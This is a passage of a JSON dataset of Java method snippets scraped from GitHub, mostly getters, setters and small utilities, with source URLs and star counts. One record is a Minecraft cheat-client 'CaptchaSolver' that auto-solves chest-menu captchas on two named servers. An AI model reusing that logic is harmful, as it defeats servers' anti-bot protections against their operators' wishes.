"https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/vlc/src/main/java/org/videolan/libvlc/util/MediaBrowser.java", "stars": "4", "class": {"name": "MediaBrowser", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setIgnoreFileTypes", "params": ["String"], "throws": null, "modifiers": ["synchronized", "public"], "return_type": "void", "snippet": "    public synchronized void setIgnoreFileTypes(String list) {        mIgnoreList = list;    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/vlc/src/main/java/org/videolan/libvlc/util/MediaBrowser.java", "stars": "4", "class": {"name": "MediaBrowser", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getCid", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "    public Integer getCid() {        return cid;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/ContentDomain.java", "stars": "2", "class": {"name": "ContentDomain", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setCid", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setCid(Integer cid) {        this.cid = cid;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/ContentDomain.java", "stars": "2", "class": {"name": "ContentDomain", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getTitle", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getTitle() {        return title;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/ContentDomain.java", "stars": "2", "class": {"name": "ContentDomain", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setTitle", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setTitle(String title) {        this.title = title;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/ContentDomain.java", "stars": "2", "class": {"name": "ContentDomain", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getTitlePic", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getTitlePic() {        return titlePic;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/ContentDomain.java", "stars": "2", "class": {"name": "ContentDomain", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setTitlePic", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setTitlePic(String titlePic) {        this.titlePic = titlePic;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/ContentDomain.java", "stars": "2", "class": {"name": "ContentDomain", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getSlug", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getSlug() {        return slug;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/ContentDomain.java", "stars": "2", "class": {"name": "ContentDomain", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setSlug", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setSlug(String slug) {        this.slug = slug;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/ContentDomain.java", "stars": "2", "class": {"name": "ContentDomain", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getCreated", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "    public Integer getCreated() {        return created;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/ContentDomain.java", "stars": "2", "class": {"name": "ContentDomain", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setCreated", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setCreated(Integer created) {        this.created = created;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/ContentDomain.java", "stars": "2", "class": {"name": "ContentDomain", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getModified", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "    public Integer getModified() {        return modified;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/ContentDomain.java", "stars": "2", "class": {"name": "ContentDomain", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setModified", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setModified(Integer modified) {        this.modified = modified;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/ContentDomain.java", "stars": "2", "class": {"name": "ContentDomain", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getContent", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getContent() {        return content;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/ContentDomain.java", "stars": "2", "class": {"name": "ContentDomain", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setContent", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setContent(String content) {        this.content = content;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/ContentDomain.java", "stars": "2", "class": {"name": "ContentDomain", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getAuthorId", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "    public Integer getAuthorId() {        return authorId;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/ContentDomain.java", "stars": "2", "class": {"name": "ContentDomain", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setAuthorId", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setAuthorId(Integer authorId) {        this.authorId = authorId;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/ContentDomain.java", "stars": "2", "class": {"name": "ContentDomain", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getType", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getType() {        return type;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/ContentDomain.java", "stars": "2", "class": {"name": "ContentDomain", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setType", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setType(String type) {        this.type = type;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/ContentDomain.java", "stars": "2", "class": {"name": "ContentDomain", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getStatus", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getStatus() {        return status;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/ContentDomain.java", "stars": "2", "class": {"name": "ContentDomain", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setStatus", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setStatus(String status) {        this.status = status;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/ContentDomain.java", "stars": "2", "class": {"name": "ContentDomain", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getTags", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getTags() {        return tags;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/ContentDomain.java", "stars": "2", "class": {"name": "ContentDomain", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setTags", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setTags(String tags) {        this.tags = tags;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/ContentDomain.java", "stars": "2", "class": {"name": "ContentDomain", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getCategories", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getCategories() {        return categories;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/ContentDomain.java", "stars": "2", "class": {"name": "ContentDomain", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setCategories", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setCategories(String categories) {        this.categories = categories;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/ContentDomain.java", "stars": "2", "class": {"name": "ContentDomain", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getHits", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "    public Integer getHits() {        return hits;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/ContentDomain.java", "stars": "2", "class": {"name": "ContentDomain", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setHits", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setHits(Integer hits) {        this.hits = hits;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/ContentDomain.java", "stars": "2", "class": {"name": "ContentDomain", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getCommentsNum", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "    public Integer getCommentsNum() {        return commentsNum;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/ContentDomain.java", "stars": "2", "class": {"name": "ContentDomain", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setCommentsNum", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setCommentsNum(Integer commentsNum) {        this.commentsNum = commentsNum;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/ContentDomain.java", "stars": "2", "class": {"name": "ContentDomain", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getAllowComment", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "    public Integer getAllowComment() {        return allowComment;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/ContentDomain.java", "stars": "2", "class": {"name": "ContentDomain", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setAllowComment", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setAllowComment(Integer allowComment) {        this.allowComment = allowComment;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/ContentDomain.java", "stars": "2", "class": {"name": "ContentDomain", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getAllowPing", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "    public Integer getAllowPing() {        return allowPing;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/ContentDomain.java", "stars": "2", "class": {"name": "ContentDomain", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setAllowPing", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setAllowPing(Integer allowPing) {        this.allowPing = allowPing;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/ContentDomain.java", "stars": "2", "class": {"name": "ContentDomain", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getAllowFeed", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "    public Integer getAllowFeed() {        return allowFeed;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/ContentDomain.java", "stars": "2", "class": {"name": "ContentDomain", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setAllowFeed", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setAllowFeed(Integer allowFeed) {        this.allowFeed = allowFeed;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/ContentDomain.java", "stars": "2", "class": {"name": "ContentDomain", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getOperationType", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getOperationType() {        return operationType;    }", "url": "https://raw.githubusercontent.com/Bekzatiitu/Final_Bekzat_Bekarys_ishs1901/master/Final%20Bekzat%20Bekarys%20ishs1901/src/kenn/shi/PackageData.java", "stars": "1", "class": {"name": "PackageData", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "setOperationType", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setOperationType(String operationType) {        this.operationType = operationType;    }", "url": "https://raw.githubusercontent.com/Bekzatiitu/Final_Bekzat_Bekarys_ishs1901/master/Final%20Bekzat%20Bekarys%20ishs1901/src/kenn/shi/PackageData.java", "stars": "1", "class": {"name": "PackageData", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "getYou", "params": [], "throws": null, "modifiers": ["public"], "return_type": "You", "snippet": "    public You getYou() {        return you;    }", "url": "https://raw.githubusercontent.com/Bekzatiitu/Final_Bekzat_Bekarys_ishs1901/master/Final%20Bekzat%20Bekarys%20ishs1901/src/kenn/shi/PackageData.java", "stars": "1", "class": {"name": "PackageData", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "setYou", "params": ["You"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setYou(You you) {        this.you = you;    }", "url": "https://raw.githubusercontent.com/Bekzatiitu/Final_Bekzat_Bekarys_ishs1901/master/Final%20Bekzat%20Bekarys%20ishs1901/src/kenn/shi/PackageData.java", "stars": "1", "class": {"name": "PackageData", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "getYous", "params": [], "throws": null, "modifiers": ["public"], "return_type": "ArrayList<You>", "snippet": "    public ArrayList<You> getYous() {        return yous;    }", "url": "https://raw.githubusercontent.com/Bekzatiitu/Final_Bekzat_Bekarys_ishs1901/master/Final%20Bekzat%20Bekarys%20ishs1901/src/kenn/shi/PackageData.java", "stars": "1", "class": {"name": "PackageData", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "setYous", "params": ["ArrayList<You>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setYous(ArrayList<You> yous) {        this.yous = yous;    }", "url": "https://raw.githubusercontent.com/Bekzatiitu/Final_Bekzat_Bekarys_ishs1901/master/Final%20Bekzat%20Bekarys%20ishs1901/src/kenn/shi/PackageData.java", "stars": "1", "class": {"name": "PackageData", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "onUpdate", "params": ["UpdateEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onUpdate(UpdateEvent event) {        if (mc.getCurrentServerData() == null)            return;        if (mc.player.openContainer instanceof ContainerChest) {            ContainerChest chest = (ContainerChest) mc.player.openContainer;            IInventory inv = chest.getLowerChestInventory();            String serverName = mc.getCurrentServerData().serverIP;            if (inv.hasCustomName()) {                String chestName = inv.getDisplayName().getFormattedText();                    if (StringUtils.containsIgnoreCase(serverName, \"endcrystal.me\")) {                        for (int i = 9; i < 45; ++i) {                            if (chest.getSlot(i).getHasStack()) {                                ItemStack is = chest.getSlot(i).getStack();                                if (is.getItem() == Items.DIAMOND_SWORD && is.getDisplayName().contains(\"\u00a7a\")) {                                    mc.playerController.windowClick(chest.windowId, InventoryUtil.getItemSlot(chest, is.getItem()), 0, ClickType.PICKUP, mc.player);                                    mc.playerController.updateController();                                }                            }                        }                    }                    if (StringUtils.containsIgnoreCase(serverName, \"mc.salc1.com\") && chestName.contains(\"Click \")) {                            String strippedName = ChatFormatting.stripFormatting(inv.getName()                                .replace(\"Click on the \", \"\"));                        if (strippedName.equalsIgnoreCase(\"Jack_o'_Lantern\"))                            strippedName = \"Jack_o'Lantern\";                        strippedName = strippedName.replace(\"spade\", \"shovel\")                                .replace(\"enchantment\", \"enchanting\")                                .replace(\"o'_lantern\", \"o'lantern\");                        if (InventoryUtil.getItemCount(chest, Item.getByNameOrId(strippedName.toLowerCase())) > 0) {                            mc.playerController.windowClick(chest.windowId, InventoryUtil.getItemSlot(chest, Item.getByNameOrId(strippedName.toLowerCase())), 0, ClickType.PICKUP, mc.player);                            mc.playerController.updateController();                        }                    }                }            }        }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/client/modules/misc/CaptchaSolver.java", "stars": "12", "class": {"name": "CaptchaSolver", "extends": "Module", "implements": null, "modifiers": ["public"]}}, {"method_name": "getCarryingCapacity", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Float", "snippet": "  public Float getCarryingCapacity() {    return carryingCapacity;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/discriminator/Truck.java", "stars": "15", "class": {"name": "Truck", "extends": "Vehicle", "implements": null, "modifiers": ["public"]}}, {"method_name": "setCarryingCapacity", "params": ["Float"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setCarryingCapacity(Float carryingCapacity) {    this.carryingCapacity = carryingCapacity;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/discriminator/Truck.java", "stars": "15", "class": {"name": "Truck", "extends": "Vehicle", "implements": null, "modifiers": ["public"]}}, {"method_name": "leer", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void leer(String rutaArch){        this.rutaArch = rutaArch;        try {            //Instacia de Scanner para la lectura del archivo            Scanner lectura = new Scanner(new File(rutaArch));            //Recorrido del archivo, linea por linea            while(lectura.hasNextLine()){                //Se va concatenando el texto que se lee                datos = datos + lectura.nextLine();                //Cada pasada es una linea leida, por lo tanto le concateno un salto de linea para no perder el formato                //Cuando sea false la lectura ya no pondra un salto de linea, estaria de mas al original                if(lectura.hasNextLine() != false){                    datos = datos + \"\\n\";                    //System.out.println(lectura.hasNextLine());                }            }            lectura.close();        } catch (FileNotFoundException ex) {            Logger.getLogger(AbrirArchivo.class.getName()).log(Level.SEVERE, null, ex);        }    }", "url": "https://raw.githubusercontent.com/vandelvan/Decodificador/master/InstructionSet/src/main/AbrirArchivo.java", "stars": "2", "class": {"name": "AbrirArchivo", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getData", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getData(){        return datos;    }", "url": "https://raw.githubusercontent.com/vandelvan/Decodificador/master/InstructionSet/src/main/AbrirArchivo.java", "stars": "2", "class": {"name": "AbrirArchivo", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "show", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void show() {        System.out.println(\"\u725b\u5728\u755c\u725b\u5382\u4e2d\");    }", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/creational/factorymethod/Cattle.java", "stars": "2", "class": {"name": "Cattle", "extends": null, "implements": ["Animal"], "modifiers": ["public"]}}, {"method_name": "addUrl", "params": ["UrlParam"], "throws": ["DefaultException", "JsonProcessingException"], "modifiers": ["public"], "return_type": "Response", "snippet": "  public Response addUrl(UrlParam urlParam) throws DefaultException, JsonProcessingException {    CommonUtil.isNotNull(urlParam);    Map<String, String> paraMap = new HashMap<>();    paraMap.put(\"appid\", urlParam.getAppid());    paraMap.put(\"appkey\", urlParam.getAppkey());    paraMap.put(\"type\", Const.OPERATION_ADD);    paraMap.put(\"url\", urlParam.getUrl());    if (StringUtils.isNotEmpty(urlParam.getFrequency())) {      paraMap.put(\"frequency\", urlParam.getFrequency());    }    if(StringUtils.isNotEmpty(urlParam.getIsMonitor())){      paraMap.put(\"is_monitor\", urlParam.getIsMonitor());    }    String result = httpClient.doPost(CYCLE_CHECK_URL, paraMap);    return objectMapper.readValue(result, new TypeReference<Response>() {    });  }", "url": "https://raw.githubusercontent.com/wechaturl/wechat_url_api_java_sdk/master/src/main/java/www/wechaturl/us/fangfeng/sdk/service/DomainUrlMonitorService.java", "stars": "2", "class": {"name": "DomainUrlMonitorService", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "deleteUrl", "params": ["UrlParam"], "throws": ["DefaultException", "JsonProcessingException"], "modifiers": ["public"], "return_type": "Response", "snippet": "  public Response deleteUrl(UrlParam urlParam) throws DefaultException, JsonProcessingException {    CommonUtil.isNotNull(urlParam);    Map<String, String> paraMap = new HashMap<>();    paraMap.put(\"appid\", urlParam.getAppid());    paraMap.put(\"appkey\", urlParam.getAppkey());    paraMap.put(\"type\", Const.OPERATION_DELETE);    if(StringUtils.isNotEmpty(urlParam.getId())){      paraMap.put(\"id\", urlParam.getId());    }else {      paraMap.put(\"url\", urlParam.getUrl());    }    String result = httpClient.doPost(CYCLE_CHECK_URL, paraMap);    return objectMapper.readValue(result, new TypeReference<Response>() {    });  }", "url": "https://raw.githubusercontent.com/wechaturl/wechat_url_api_java_sdk/master/src/main/java/www/wechaturl/us/fangfeng/sdk/service/DomainUrlMonitorService.java", "stars": "2", "class": {"name": "DomainUrlMonitorService", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "updateUrl", "params": ["UrlParam"], "throws": ["DefaultException", "JsonProcessingException"], "modifiers": ["public"], "return_type": "Response", "snippet": "  public Response updateUrl(UrlParam urlParam) throws DefaultException, JsonProcessingException {    CommonUtil.isNotNull(urlParam);    Map<String, String> paraMap = new HashMap<>();    paraMap.put(\"appid\", urlParam.getAppid());    paraMap.put(\"appkey\", urlParam.getAppkey());    paraMap.put(\"type\", Const.OPERATION_EDIT);    paraMap.put(\"url\", urlParam.getUrl());    if (StringUtils.isNotEmpty(urlParam.getFrequency())) {      paraMap.put(\"frequency\", urlParam.getFrequency());    }    if(StringUtils.isNotEmpty(urlParam.getIsMonitor())){      paraMap.put(\"is_monitor\", urlParam.getIsMonitor());    }    String result = httpClient.doPost(CYCLE_CHECK_URL, paraMap);    return objectMapper.readValue(result, new TypeReference<Response>() {    });  }", "url": "https://raw.githubusercontent.com/wechaturl/wechat_url_api_java_sdk/master/src/main/java/www/wechaturl/us/fangfeng/sdk/service/DomainUrlMonitorService.java", "stars": "2", "class": {"name": "DomainUrlMonitorService", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "listUrl", "params": ["UrlParam"], "throws": ["DefaultException", "JsonProcessingException"], "modifiers": ["public"], "return_type": "Response<UrlArrayVO>", "snippet": "  public Response<UrlArrayVO<DomainUrlMonitorVO>> listUrl(UrlParam urlParam) throws DefaultException, JsonProcessingException {    CommonUtil.isNotNull(urlParam);    Map<String, String> paraMap = new HashMap<>();    paraMap.put(\"appid\", urlParam.getAppid());    paraMap.put(\"appkey\", urlParam.getAppkey());    paraMap.put(\"type\", Const.OPERATION_LIST);    if (StringUtils.isNotEmpty(urlParam.getPage())) {      paraMap.put(\"page\", urlParam.getPage());    }    if (StringUtils.isNotEmpty(urlParam.getRows())) {      paraMap.put(\"rows\", urlParam.getRows());    }    String result = httpClient.doPost(CYCLE_CHECK_URL, paraMap);    return objectMapper.readValue(result, new TypeReference<Response<UrlArrayVO<DomainUrlMonitorVO>>>() {    });  }", "url": "https://raw.githubusercontent.com/wechaturl/wechat_url_api_java_sdk/master/src/main/java/www/wechaturl/us/fangfeng/sdk/service/DomainUrlMonitorService.java", "stars": "2", "class": {"name": "DomainUrlMonitorService", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "listFrequency", "params": ["UrlParam"], "throws": ["DefaultException", "JsonProcessingException"], "modifiers": ["public"], "return_type": "Response<List>", "snippet": "  public Response<List<Integer>> listFrequency(UrlParam urlParam) throws DefaultException, JsonProcessingException {    CommonUtil.isNotNull(urlParam);    Map<String, String> paraMap = new HashMap<>();    paraMap.put(\"appid\", urlParam.getAppid());    paraMap.put(\"appkey\", urlParam.getAppkey());    paraMap.put(\"type\", Const.OPERATION_FREQUENCY);    String result = httpClient.doPost(CYCLE_CHECK_URL, paraMap);    return objectMapper.readValue(result, new TypeReference<Response<List<Integer>>>() {    });  }", "url": "https://raw.githubusercontent.com/wechaturl/wechat_url_api_java_sdk/master/src/main/java/www/wechaturl/us/fangfeng/sdk/service/DomainUrlMonitorService.java", "stars": "2", "class": {"name": "DomainUrlMonitorService", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "singleUrlCheck", "params": ["UrlParam"], "throws": ["DefaultException", "JsonProcessingException"], "modifiers": ["public"], "return_type": "Response<DomainCheckResultVO>", "snippet": "  public Response<DomainCheckResultVO> singleUrlCheck(UrlParam urlParam) throws DefaultException, JsonProcessingException {    CommonUtil.isNotNull(urlParam);    Map<String, String> paraMap = new HashMap<>();    paraMap.put(\"appid\", urlParam.getAppid());    paraMap.put(\"appkey\", urlParam.getAppkey());    paraMap.put(\"url\", urlParam.getUrl());    String result = httpClient.doPost(URL_CHECK_URL, paraMap);    return objectMapper.readValue(result, new TypeReference<Response<DomainCheckResultVO>>() {    });  }", "url": "https://raw.githubusercontent.com/wechaturl/wechat_url_api_java_sdk/master/src/main/java/www/wechaturl/us/fangfeng/sdk/service/DomainUrlMonitorService.java", "stars": "2", "class": {"name": "DomainUrlMonitorService", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "copyExternalResource", "params": ["File", "File"], "throws": ["IOException"], "modifiers": ["public", "static"], "return_type": "void", "snippet": "  public static void copyExternalResource(File sourceFile, File destFile) throws IOException {    if (!destFile.exists()) {      destFile.createNewFile();    }    try (FileInputStream source = new FileInputStream(sourceFile);         FileOutputStream destination = new FileOutputStream(destFile)) {      destination.getChannel().transferFrom(source.getChannel(), 0, source.getChannel().size());    }  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/io/ExternalResources.java", "stars": "15", "class": {"name": "ExternalResources", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getConfiguredTemplate", "params": ["String", "String"], "throws": ["FileNotFoundException"], "modifiers": ["public", "static"], "return_type": "String", "snippet": "  public static String getConfiguredTemplate(String templatePath, String templateProperty) throws FileNotFoundException {    String templateName = \"\";    Properties migrationProperties = new Properties();    try (InputStream is = new FileInputStream(templatePath)) {      migrationProperties.load(is);      templateName = migrationProperties.getProperty(templateProperty);    } catch (FileNotFoundException e) {      throw e;    } catch (Exception e) {      log.error(\"\", e);    }    return templateName;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/io/ExternalResources.java", "stars": "15", "class": {"name": "ExternalResources", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "main", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {        System.out.print(\"Data Visualization\");    }", "url": "https://raw.githubusercontent.com/Collinsbrefo123/DATA-VISUALIZATION/master/src/Data_Visualization.java", "stars": "2", "class": {"name": "Data_Visualization", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "blockOnFinishedStatus", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Status", "snippet": "  public Status blockOnFinishedStatus() {    if (this.status == null) {      return null;    }    while (!Status.isStatusFinished(this.status)) {      synchronized (this) {        try {          this.wait(WAIT_TIME);        } catch (final InterruptedException e) {        }      }    }    return this.status;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/event/BlockingStatus.java", "stars": "18", "class": {"name": "BlockingStatus", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "viewStatus", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Status", "snippet": "  public Status viewStatus() {    return this.status;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/event/BlockingStatus.java", "stars": "18", "class": {"name": "BlockingStatus", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "unblock", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void unblock() {    synchronized (this) {      this.notifyAll();    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/event/BlockingStatus.java", "stars": "18", "class": {"name": "BlockingStatus", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "changeStatus", "params": ["Status"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void changeStatus(final Status status) {    synchronized (this) {      this.status = status;      if (Status.isStatusFinished(status)) {        unblock();      }    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/event/BlockingStatus.java", "stars": "18", "class": {"name": "BlockingStatus", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getExecId", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "  public int getExecId() {    return this.execId;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/event/BlockingStatus.java", "stars": "18", "class": {"name": "BlockingStatus", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getJobId", "params": [], "throws": null, 